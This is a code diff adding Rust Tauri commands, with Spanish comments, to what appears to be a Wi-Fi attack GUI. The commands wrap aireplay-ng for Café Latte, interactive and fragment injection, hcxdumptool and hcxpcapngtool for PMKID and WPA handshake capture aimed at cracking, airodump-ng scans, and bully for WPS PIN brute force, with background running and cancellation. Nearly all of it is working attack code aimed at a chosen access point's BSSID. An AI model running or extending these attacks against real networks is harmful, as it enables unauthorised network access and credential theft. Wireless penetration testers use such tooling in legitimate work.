+// COMANDO 22 — CAFÉ LATTE ATTACK  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn cafe_latte_attack(app: AppHandle, bssid: String, client_mac: Option<String>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let mac = client_mac.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
+    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
+    let args = vec!["--cafe-latte".into(), "-a".into(), bssid.clone(), "-h".into(), mac.clone(), iface_in.clone()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nMAC cliente: {}\nInterface: {}\n\n{}", prog.display(), bssid, mac, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Café Latte · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 23 — INTERACTIVE INJECT  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn interactive_inject(app: AppHandle, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
+    let args = vec!["--interactive".into(), iface_in.clone()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nInterface: {}\n\n{}", prog.display(), iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Interactive Inject · {}", iface_in), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 24 — FRAGMENT INJECT  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+#[command]
+pub async fn fragment_inject(app: AppHandle, bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let src_mac = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
+    let iface_in = iface.unwrap_or_else(|| "wlan0mon".into());
+    let args = vec!["--fragment".into(), "-a".into(), bssid.clone(), "-h".into(), src_mac.clone(), iface_in.clone()];
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\n\n{}", prog.display(), bssid, src_mac, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Fragment Inject · {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDOS BACKGROUND + CANCELACIÓN
+// ═══════════════════════════════════════════════════════════════════════════════
+
+use crate::AppState;
+use tauri::State;
+use tauri_plugin_shell::process::CommandEvent;
+
+/// Helper: lanza un binario en background y guarda el child en el mapa de ataques
+async fn run_bin_bg(app: &AppHandle, state: &State<'_, AppState>, attack_id: &str, exe: &str, args: &[String]) -> CmdResponse {
+    let shell = app.shell();
+    let arg_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
+    let (mut rx, child) = match shell.command(exe).args(&arg_refs).spawn() {
+        Ok(result) => result,
+        Err(e) => return CmdResponse {
+            success: false, output: String::new(),
+            stderr: e.to_string(), exit_code: None,
+        },
+    };
+    {
+        let mut map = state.running_attacks.lock().unwrap();
+        map.insert(attack_id.to_string(), child);
+    }
+    let mut stdout = String::new();
+    let mut stderr = String::new();
+    let mut exit_code = None;
+    while let Some(event) = rx.recv().await {
+        match event {
+            CommandEvent::Stdout(data) => { stdout.push_str(&String::from_utf8_lossy(&data)); }
+            CommandEvent::Stderr(data) => { stderr.push_str(&String::from_utf8_lossy(&data)); }
+            CommandEvent::Terminated(status) => { exit_code = status.code; break; }
+            CommandEvent::Error(err) => { stderr.push_str(&format!("Error: {}", err)); break; }
+            _ => {}
+        }
+    }
+    {
+        let mut map = state.running_attacks.lock().unwrap();
+        map.remove(attack_id);
+    }
+    let success = exit_code == Some(0);
+    CmdResponse { success, output: stdout, stderr, exit_code }
+}
+
+/// Cancelar un ataque en background por su ID
+#[command]
+pub async fn cancel_attack(state: State<'_, AppState>, attack_id: String) -> Result<CmdResponse, String> {
+    let mut map = state.running_attacks.lock().unwrap();
+    if let Some(child) = map.remove(&attack_id) {
+        let _ = child.kill();
+        Ok(CmdResponse {
+            success: true,
+            output: format!("Ataque '{}' cancelado.", attack_id),
+            stderr: String::new(),
+            exit_code: Some(-1),
+        })
+    } else {
+        Ok(CmdResponse {
+            success: false,
+            output: format!("No se encontró ataque activo con ID '{}'", attack_id),
+            stderr: String::new(),
+            exit_code: None,
+        })
+    }
+}
+
+
+/// PMKID Capture en background
+#[command]
+pub async fn pmkid_capture_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, channel: Option<u8>, duration_seconds: Option<u64>) -> Result<CmdResponse, String> {
+    let attack_id = format!("pmkid_{}", bssid.replace(':', ""));
+    let prog = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
+    let ch = channel.unwrap_or(1);
+    let dur = duration_seconds.unwrap_or(120);
+    let outfile = format!("capture_{}.pcapng", bssid.replace(':', ""));
+    let mut args = vec![
+        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
+        "-i".into(), "-t".into(), dur.to_string(),
+        "-w".into(), outfile.clone(), "--bssid".into(), bssid.clone(),
+    ];
+    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
+    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
+    let body = format!("Binario: {}\nArchivo: {}\n\n{}", prog.display(), outfile, r.output);
+    Ok(CmdResponse { success: r.success, output: wrap(&format!("PMKID Capture BG · {} · Canal={} · {}s", bssid, ch, dur), &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
+}
+
+/// Handshake Capture en background
+#[command]
+pub async fn capture_handshake_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, essid: Option<String>, channel: Option<u8>, duration_seconds: Option<u64>) -> Result<CmdResponse, String> {
+    let attack_id = format!("handshake_{}", bssid.replace(':', ""));
+    let dur = duration_seconds.unwrap_or(60);
+    let ch = channel.unwrap_or(1);
+    let bssid_clean = bssid.replace(':', "");
+    let pcap = format!("handshake_{}.pcapng", bssid_clean);
+    let hccapx = format!("handshake_{}.hccapx", bssid_clean);
+    let mut args = vec![
+        "--fcs".into(), "--enable_status=1".into(), "--status_interval=5000".into(),
+        "-i".into(), "-t".into(), dur.to_string(),
+        "-w".into(), pcap.clone(), "--bssid".into(), bssid.clone(),
+        "--channel".into(), ch.to_string(),
+    ];
+    if let Some(ref e) = essid { args.push("--essid".into()); args.push(e.clone()); }
+    let prog = tool_path("HCXDUMPTOOL_PATH", "hcxdumptool.exe");
+    let cap = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("hcxdumptool.exe"), &args).await;
+    let conv = if cap.success {
+        let prog2 = tool_path("HCXPCAPNGTOOL_PATH", "hcxpcapngtool.exe");
+        let c_args = vec!["-k".into(), "-o".into(), hccapx.clone(), pcap.clone()];
+        run_bin(&app, prog2.to_str().unwrap_or("hcxpcapngtool.exe"), &c_args).await
+    } else { CmdResponse { success: false, output: cap.output.clone(), stderr: cap.stderr.clone(), exit_code: cap.exit_code } };
+    let ok = conv.success;
+    let body = format!("Paso 1 — Captura:\n{}\n\nPaso 2 — Extracción EAPOL:\n{}\nArchivo: {}", cap.output, conv.output, hccapx);
+    Ok(CmdResponse { success: ok, output: wrap(&format!("Handshake Capture BG · {} · Canal={} · {}s", bssid, ch, dur), &body, ok), stderr: format!("{}\n{}", cap.stderr, conv.stderr), exit_code: conv.exit_code })
+}
+
+/// Scan Airodump en background
+#[command]
+pub async fn scan_airodump_bg(app: AppHandle, state: State<'_, AppState>, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> Result<CmdResponse, String> {
+    let attack_id = "airodump_scan".to_string();
+    let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
+    let ch = channel_filter.unwrap_or(0);
+    let dur = duration_secs.unwrap_or(60);
+    let mut args = vec!["--write-interval".into(), "1000".into(), "--output-format".into(), "csv".into()];
+    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
+    if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
+    args.push("wlan0mon".into());
+    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nCanal: {}  Duración: {}s\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, r.output);
+    Ok(CmdResponse { success: r.success, output: wrap("AIRODUMP Scan BG", &body, r.success), stderr: r.stderr, exit_code: r.exit_code })
+}
+
+/// WPS PIN Bruteforce en background
+#[command]
+pub async fn wps_pin_bruteforce_bg(app: AppHandle, state: State<'_, AppState>, bssid: String, interface: String) -> Result<CmdResponse, String> {
+    let attack_id = format!("wps_{}", bssid.replace(':', ""));
+    let prog = tool_path("BULLY_PATH", "bully.exe");
+    let args = vec!["-b".into(), bssid.clone(), interface.clone()];
+    let r = run_bin_bg(&app, &state, &attack_id, prog.to_str().unwrap_or("bully.exe"), &args).await;
+    let summary = if r.output.to_lowercase().contains("pin:") {
+        format!("PIN encontrado:\n{}", r.output.lines().filter(|l| l.to_lowercase().contains("pin:")).collect::<Vec<_>>().join("\n"))
+    } else { "bully ejecutado en background.".into() };
+    Ok(CmdResponse { success: r.success, output: wrap(&format!("WPS Bruteforce BG · {} · {}", bssid, interface), &summary, r.success), stderr: r.stderr, exit_code: r.exit_code })
+}
+
 
